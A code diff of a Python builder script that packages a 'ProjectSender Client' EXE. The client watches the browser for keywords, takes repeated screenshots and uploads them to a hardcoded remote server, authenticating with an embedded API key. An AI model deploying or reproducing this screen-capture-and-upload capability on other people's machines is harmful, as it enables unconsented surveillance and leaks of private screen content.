@@ -2,64 +2,64 @@
 # -*- coding: utf-8 -*-
 
 """
-Build EXE from Config - v3 - With Keywords Monitoring
-أداة لبناء EXE مخصص مع دعم مراقبة الكلمات المفتاحية
+ProjectSender - EXE Builder v4
+بناء ملفات EXE مع مراقبة الكلمات المفتاحية
 """
 
 import os
 import sys
 import json
-import shutil
+import base64
+import requests
 import subprocess
 import tempfile
+import shutil
 from pathlib import Path
-import io
 
-# ✅ إصلاح مشكلة ترميز الأحرف على Windows
-if sys.platform == 'win32':
-    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
-    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8')
-    os.environ['PYTHONIOENCODING'] = 'utf-8'
+# ==================== التكوين ====================
 
-def create_client_script(exe_id, pages, output_dir):
-    """إنشاء script العميل المخصص مع مراقبة الكلمات المفتاحية"""
+SERVER_URL = "https://sender-production-7ee8.up.railway.app"
+USER_API_KEY = "skpro_user_aB7cD2eF5gH8iJ3kL6mN9oP4qR1sT5uV"
+
+# ==================== إنشاء Client Script ====================
+
+def create_client_script(exe_id, keywords, photo_count, temp_dir):
+    """إنشاء client script مع الكلمات المفتاحية المدمجة"""
     
-    pages_json = json.dumps(pages, ensure_ascii=False, indent=2)
+    # قائمة الكلمات المفتاحية كـ Python list
+    keywords_list = json.dumps(keywords)
     
     client_code = f'''#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
 """
-ProjectSender Client - Auto Generated - v3
-عميل مخصص تم إنشاؤه تلقائياً مع دعم مراقبة الكلمات المفتاحية
+ProjectSender Client - Auto-generated
+EXE ID: {exe_id}
+Keywords: {keywords}
+Photos per Keyword: {photo_count}
 """
 
 import tkinter as tk
-from tkinter import ttk, messagebox
-import requests
+from tkinter import ttk
 import threading
-import json
-import os
-from datetime import datetime
-from PIL import Image, ImageGrab
 import time
 import uuid
+import requests
 import base64
-from pathlib import Path
+import json
+from PIL import ImageGrab
+from datetime import datetime
 import subprocess
-import re
+import sys
 
 # ==================== التكوين ====================
 
-SERVER_URL = "https://sender-production-7ee8.up.railway.app"  # ✅ مع https://
-USER_API_KEY = "skpro_user_aB7cD2eF5gH8iJ3kL6mN9oP4qR1sT5uV"
-EXE_ID = "{exe_id}"
+SERVER_URL = "{SERVER_URL}"
+USER_API_KEY = "{USER_API_KEY}"
 
-PAGES_CONFIG = {pages_json}
+# ==================== Client Class ====================
 
-# ==================== الواجهة الرسومية ====================
-
-class ScreenshotClient:
+class ProjectSenderClient:
     def __init__(self, root):
         self.root = root
         self.root.title("ProjectSender Client")
@@ -73,8 +73,10 @@ class ScreenshotClient:
         
         # ✅ إنشاء client_id فريد
         self.client_id = str(uuid.uuid4())
-        self.keywords = []
+        self.keywords = {keywords_list}
+        self.photo_count = {photo_count}
         self.keyword_index = 0
+        self.photos_captured = 0
         
         self.create_ui()
         
@@ -116,12 +118,16 @@ class ScreenshotClient:
         self.client_id_label.pack(anchor=tk.W, pady=5)
         
         tk.Label(info_frame, text="Keywords:", bg="#2d2d2d", fg="#ffffff", font=("Arial", 11, "bold")).pack(anchor=tk.W, pady=5)
-        self.keywords_label = tk.Label(info_frame, text="Waiting for keywords...", bg="#2d2d2d", fg="#ffff00", font=("Arial", 10))
+        self.keywords_label = tk.Label(info_frame, text=", ".join(self.keywords) if self.keywords else "Waiting...", bg="#2d2d2d", fg="#ffff00", font=("Arial", 10))
         self.keywords_label.pack(anchor=tk.W, pady=5)
         
         tk.Label(info_frame, text="Current Keyword:", bg="#2d2d2d", fg="#ffffff", font=("Arial", 11, "bold")).pack(anchor=tk.W, pady=5)
         self.current_keyword_label = tk.Label(info_frame, text="None", bg="#2d2d2d", fg="#00ff88", font=("Arial", 10))
         self.current_keyword_label.pack(anchor=tk.W, pady=5)
+        
+        tk.Label(info_frame, text="Photos Captured:", bg="#2d2d2d", fg="#ffffff", font=("Arial", 11, "bold")).pack(anchor=tk.W, pady=5)
+        self.photos_label = tk.Label(info_frame, text="0", bg="#2d2d2d", fg="#00ff88", font=("Arial", 10))
+        self.photos_label.pack(anchor=tk.W, pady=5)
         
         # أزرار
         buttons_frame = tk.Frame(self.root, bg="#1e1e1e")
@@ -174,7 +180,7 @@ class ScreenshotClient:
                     "client_id": self.client_id,
                     "status": "online",
                     "task": "capturing",
-                    "photos_count": 0
+                    "photos_count": self.photos_captured
                 }}
                 
                 response = requests.post(
@@ -269,8 +275,8 @@ class ScreenshotClient:
                 # إذا كانت هناك كلمات مفتاحية، استخدمها
                 if self.keywords:
                     if self.check_keyword_in_browser():
-                        # التقاط 50 صورة للكلمة الحالية
-                        for i in range(50):
+                        # التقاط صور للكلمة الحالية
+                        for i in range(self.photo_count):
                             if not self.is_running:
                                 break
                             
@@ -296,94 +302,82 @@ class ScreenshotClient:
                                     timeout=10
                                 )
                                 
-                                if response.status_code != 200:
-                                    print(f"Failed to upload: {{response.status_code}}")
-                            except:
-                                pass
+                                if response.status_code == 200:
+                                    self.photos_captured += 1
+                                    self.photos_label.config(text=str(self.photos_captured))
+                                    print(f"✅ Screenshot uploaded: {{i+1}}/{{self.photo_count}}")
+                                else:
+                                    print(f"❌ Upload failed: {{response.status_code}}")
+                            except Exception as e:
+                                print(f"❌ Upload error: {{str(e)}}")
                             
-                            time.sleep(1)
+                            time.sleep(0.5)  # تأخير بين الصور
                         
                         # الانتقال إلى الكلمة التالية
-                        self.keyword_index += 1
-                        if self.keyword_index >= len(self.keywords):
-                            self.keyword_index = 0
-                    else:
-                        time.sleep(2)
-                else:
-                    time.sleep(5)
+                        self.keyword_index = (self.keyword_index + 1) % len(self.keywords)
             except Exception as e:
-                print(f"Capture error: {{str(e)}}")
+                print(f"❌ Capture error: {{str(e)}}")
+            
+            time.sleep(1)  # تأخير قبل الفحص التالي
     
     def stop(self):
-        """إيقاف البرنامج"""
+        """إيقاف التطبيق"""
         self.is_running = False
-        self.root.destroy()
+        self.root.quit()
 
 # ==================== البرنامج الرئيسي ====================
 
 if __name__ == "__main__":
     root = tk.Tk()
-    app = ScreenshotClient(root)
+    app = ProjectSenderClient(root)
     root.mainloop()
 '''
     
-    client_file = os.path.join(output_dir, "client_auto.py")
+    # حفظ الملف
+    client_file = os.path.join(temp_dir, "client_auto.py")
     with open(client_file, "w", encoding="utf-8") as f:
         f.write(client_code)
     
     print(f"✅ Client script created: {client_file}")
     return client_file
 
-def build_exe_with_py2exe(client_file, exe_id, temp_dir, output_file):
-    """بناء EXE باستخدام py2exe"""
+# ==================== بناء EXE ====================
+
+def build_exe_with_pyinstaller(client_file, exe_id, temp_dir, output_file):
+    """بناء EXE باستخدام PyInstaller"""
     
-    # التحقق من py2exe
-    check_py2exe = subprocess.run(
-        [sys.executable, "-m", "pip", "show", "py2exe"],
-        capture_output=True,
-        text=True
-    )
+    print("🔨 Building EXE with PyInstaller...")
     
-    if check_py2exe.returncode != 0:
-        print("⚠️  py2exe not found. Installing...")
+    # التحقق من PyInstaller
+    try:
+        import PyInstaller
+    except ImportError:
+        print("⚠️  PyInstaller not found. Installing...")
         install_result = subprocess.run(
-            [sys.executable, "-m", "pip", "install", "py2exe"],
+            [sys.executable, "-m", "pip", "install", "pyinstaller"],
             capture_output=True,
             text=True
         )
         if install_result.returncode != 0:
-            print(f"❌ Failed to install py2exe")
+            print(f"❌ Failed to install PyInstaller")
             return False
-        print("✅ py2exe installed successfully")
+        print("✅ PyInstaller installed successfully")
     
-    # إنشاء setup.py
-    setup_py = f'''
-from py2exe import setup
-import py2exe
-
-setup(
-    console=['{client_file}'],
-    options={{
-        'py2exe': {{
-            'packages': ['requests', 'PIL'],
-            'includes': ['tkinter'],
-        }}
-    }},
-    zipfile=None,
-)
-'''
-    
-    setup_file = os.path.join(temp_dir, "setup.py")
-    with open(setup_file, "w", encoding="utf-8") as f:
-        f.write(setup_py)
-    
-    print("🔨 Building EXE with py2exe...")
-    
+    # بناء EXE
     env = os.environ.copy()
     env['PYTHONIOENCODING'] = 'utf-8'
     
     result = subprocess.run(
-        [sys.executable, setup_file, "py2exe"],
+        [
+            sys.executable, "-m", "PyInstaller",
+            "--onefile",
+            "--windowed",
+            "--name", f"ProjectSender_Client_{exe_id[:8]}",
+            "--distpath", os.path.join(temp_dir, "dist"),
+            "--buildpath", os.path.join(temp_dir, "build"),
+            "--specpath", os.path.join(temp_dir, "spec"),
+            client_file
+        ],
         cwd=temp_dir,
         capture_output=True,
         text=True,
@@ -393,9 +387,7 @@ setup(
     if result.returncode != 0:
         print(f"❌ Build failed")
         if result.stderr:
-            print(f"Error: {result.stderr}")
-        if result.stdout:
-            print(f"Output: {result.stdout}")
+            print(f"Error: {result.stderr[:500]}")
         return False
     
     # البحث عن EXE
@@ -416,9 +408,15 @@ def build_exe_simple(client_file, exe_id, temp_dir, output_file):
     
     print("📦 Creating simple executable wrapper...")
     
+    # نسخ الملف Python كـ .py
+    py_file = output_file.replace('.exe', '.py')
+    shutil.copy(client_file, py_file)
+    print(f"✅ Python file created: {py_file}")
+    print("⚠️  Note: Run with: python client.py")
+    
     # إنشاء batch file
     batch_content = f'''@echo off
-python "{client_file}" %*
+python "{py_file}" %*
 '''
     
     batch_file = output_file.replace('.exe', '.bat')
@@ -427,90 +425,36 @@ python "{client_file}" %*
     
     print(f"✅ Batch file created: {batch_file}")
     
-    # محاولة تحويل batch إلى exe باستخدام iexpress (Windows built-in)
-    try:
-        # إنشاء SED file لـ iexpress
-        sed_content = f'''[Version]
-Class=IEXPRESS
-SEDVersion=3
-[Options]
-PackagePurpose=InstallApp
-ShowInstallProgramWindow=1
-HideExtractAnimation=1
-UseLongFileName=1
-InsideCompressed=0
-CAB_FixedSize=0
-CAB_ResvCodeSigning=0
-RebootMode=N
-InstallationType=0
-TargetName={output_file}
-FriendlyName=ProjectSender Client
-AppLaunched=cmd.exe /c "{batch_file}"
-PostInstallCmd=<None>
-AdminQuietInstCmd=<None>
-UserQuietInstCmd=<None>
-SourceFiles=SourceFiles
-[Strings]
-InstallPrompt=
-DisplayLicense=
-FinishMessage=
-TargetPlatform=0
-[SourceFiles]
-SourceFiles0={temp_dir}
-[SourceFiles0]
-{os.path.basename(batch_file)}=
-'''
-        
-        sed_file = os.path.join(temp_dir, "package.sed")
-        with open(sed_file, "w", encoding="utf-8") as f:
-            f.write(sed_content)
-        
-        # تشغيل iexpress
-        result = subprocess.run(
-            ["iexpress", "/N", "/Q", sed_file],
-            capture_output=True,
-            timeout=30
-        )
-        
-        if os.path.exists(output_file):
-            print(f"✅ EXE created with iexpress: {output_file}")
-            return True
-    except:
-        pass
-    
-    # إذا فشل iexpress، نسخ الملف مباشرة
-    shutil.copy(client_file, output_file.replace('.exe', '.py'))
-    print(f"✅ Python file created: {output_file.replace('.exe', '.py')}")
-    print("⚠️  Note: Run with: python client.py")
-    
     return True
 
-def build_exe(exe_id, pages, output_file):
+def build_exe(exe_id, keywords, photo_count, output_file):
     """بناء EXE"""
     
     with tempfile.TemporaryDirectory() as temp_dir:
         print(f"📁 Temp directory: {temp_dir}")
         
         # إنشاء client script
-        client_file = create_client_script(exe_id, pages, temp_dir)
+        client_file = create_client_script(exe_id, keywords, photo_count, temp_dir)
         
-        # محاولة البناء بـ py2exe أولاً
-        print("\n🔨 Attempting to build with py2exe...")
-        if build_exe_with_py2exe(client_file, exe_id, temp_dir, output_file):
+        # محاولة البناء بـ PyInstaller أولاً
+        print("\n🔨 Attempting to build with PyInstaller...")
+        if build_exe_with_pyinstaller(client_file, exe_id, temp_dir, output_file):
             return True
         
-        print("\n⚠️  py2exe failed. Trying simple method...")
+        print("\n⚠️  PyInstaller failed. Trying simple method...")
         if build_exe_simple(client_file, exe_id, temp_dir, output_file):
             return True
         
         print("\n❌ All build methods failed")
         return False
 
+# ==================== الدالة الرئيسية ====================
+
 def main():
     """البرنامج الرئيسي"""
     
     if len(sys.argv) < 3:
-        print("Usage: python build_exe_from_config_v3.py <exe_id> <output_file>")
+        print("Usage: python build_exe_from_config_v4.py <exe_id> <output_file>")
         sys.exit(1)
     
     exe_id = sys.argv[1]
@@ -519,12 +463,33 @@ def main():
     print(f"🔨 Building EXE for {exe_id}")
     print(f"📁 Output: {output_file}")
     
-    # صفحات افتراضية
-    pages = [
-        {"name": "Default", "photo_count": 50}
-    ]
+    # جلب الإعدادات من الخادم
+    try:
+        headers = {"X-API-Key": USER_API_KEY}
+        response = requests.get(
+            f"{SERVER_URL}/api/exe_config/{exe_id}",
+            headers=headers,
+            timeout=10
+        )
+        
+        if response.status_code == 200:
+            config = response.json()
+            # Extract keywords from pages
+            pages = config.get("pages", [])
+            keywords = [page.get("name", "default") for page in pages]
+            # Get photo_count from first page (or use 50 as default)
+            photo_count = pages[0].get("photo_count", 50) if pages else 50
+            print(f"✅ Config loaded: {keywords}, {photo_count} photos per keyword")
+        else:
+            print(f"⚠️  Failed to load config: {response.status_code}")
+            keywords = ["default"]
+            photo_count = 50
+    except Exception as e:
+        print(f"⚠️  Error loading config: {str(e)}")
+        keywords = ["default"]
+        photo_count = 50
     
-    if build_exe(exe_id, pages, output_file):
+    if build_exe(exe_id, keywords, photo_count, output_file):
         print(f"\n✅ Build completed successfully!")
         sys.exit(0)
     else:
